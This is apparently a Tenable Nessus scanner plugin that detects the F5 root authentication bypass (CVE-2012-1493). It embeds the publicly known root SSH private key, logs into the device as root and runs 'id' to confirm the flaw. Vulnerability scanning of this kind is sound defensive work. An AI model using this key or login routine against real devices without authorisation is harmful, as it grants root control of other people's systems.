#TRUSTED 9cabdff8201d59fd625b0b37b1d1ddaf8af5012273e6157de0e6806f30f9365c0cfdb0ce46a4b5d09f0285bf559f2c29af30cef113478dc3c8334d8377d7727c44e3953083e09ee16afa379f05192146033fc03eb4f186a9236c3d51ae99027f4d2585bb0cbfa0054b5d23a36f434c82c24fe7a235ec5462cabe0b555aa4c8ff47548dea0880860f85c36c8e63cb39ab78eeed9bff750b52f987bb885442b5d07283609e54c385117ca8dd6aa973c958f86c7d493168cb2e2a95c9fd2f402d4b82e5ca03f95fd4a289d6ad3284fa185f1920e33b51556e32688813f23c8a86fa8881a931847cf0cfb261f99e250c03d3dc310ad043dce162301d3b70dd49eda250a06eca15989705dae21c59a0c971c7a13030800144e364aaa1c039c87340c4778a4bc9bbaff436b52a06e8ebaed43c8867c726952922113938b23a7a34e9a782b7c9a3331d484d4a364a454830ccb59eb9c550de504dd55186f70b203e4dbd9d564558e58417811243ae0b439b0a0252d44c4d53595a52b4c5bbf9c1f167f2c3db5c9960ba0251cad9d21953bbd4d735a499076fc68b9ad29bdc1bb63c68724619c784198943e77f241476ad29dfa4aeb27a94e65b450eb84ba828b5993d3b7bba4380e723eb2467457aec86ec54f3de889eaf6c911da7b45e639c92b3cb1f59442f0c49c9df8b07326152802eb38a7388fa7ea15a66c7709b0b30be521074
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59477);
  script_version("1.5");
  script_set_attribute(attribute:"plugin_modification_date", value:"2013/12/04");

  script_cve_id("CVE-2012-1493");
  script_bugtraq_id(53897);
  script_osvdb_id(82780);
  script_xref(name:"EDB-ID", value:"19064");
  script_xref(name:"EDB-ID", value:"19091");

  script_name(english:"F5 Multiple Products Root Authentication Bypass");
  script_summary(english:"Checks if a given public key is valid for root");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote host has an authentication bypass vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote F5 device has an authentication bypass vulnerability.  The
SSH private key for the root user is publicly known.  A remote,
unauthenticated attacker could exploit this to login as root."
  );
  script_set_attribute(attribute:"see_also", value:"https://www.trustmatta.com/advisories/MATTA-2012-002.txt");
  script_set_attribute(attribute:"see_also", value:"http://support.f5.com/kb/en-us/solutions/public/13000/600/sol13600.html");
  script_set_attribute(attribute:"solution", value:"Apply the relevant fix referenced by F5 advisory SOL13600.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'F5 BIG-IP SSH Private Key Exposure');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/06/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/06/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/06/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2012-2013 Tenable Network Security, Inc.");

  script_dependencies("ssh_detect.nasl");
  script_require_ports("Services/ssh", 22);
  script_exclude_keys("global_settings/supplied_logins_only");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("ssh_func.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

user = 'root';
private_key ='-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh
UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk
OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB
gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF
8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv
7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM
2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s
37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL
RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4
rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/
uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU
Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G
LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS
-----END RSA PRIVATE KEY-----';
public_key = 'AAAAB3NzaC1yc2EAAAABIwAAAIEAvIhC5skTzxyHif/7iy3yhxuK6/OB13hjPqrskogkYFrcW8OK4VJT+5+Fx7wd4sQCnVn8rNqahw/x6sfcOMDI/Xvn4yKU4t8TnYf2MpUVr4ndz39L5Ds1n7Si1m2suUNxWbKv58I8+NMhlt2ITraSuTU0NGymWOc8+LNi+MHXdLk=';

port = kb_ssh_transport();
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

_ssh_socket = open_sock_tcp(port);
if (!_ssh_socket) audit(AUDIT_SOCK_FAIL, port);

ret = ssh_login(login:user, pub:public_key, priv:private_key);
if (ret != 0) audit(AUDIT_HOST_NOT, 'affected');

output = ssh_cmd(cmd:'id', nosh:TRUE, nosudo:TRUE);
ssh_close_connection();

if (!output || "uid=" >!< output) audit(AUDIT_RESP_BAD, port, "an 'id' command");

if (report_verbosity > 0)
{
  report =
    '\nNessus authenticated via SSH using the following private key :\n\n' +
    private_key + '\n\n' +
    'After authenticating Nessus executed the "id" command which returned :\n\n' +
    chomp(output) + '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port);

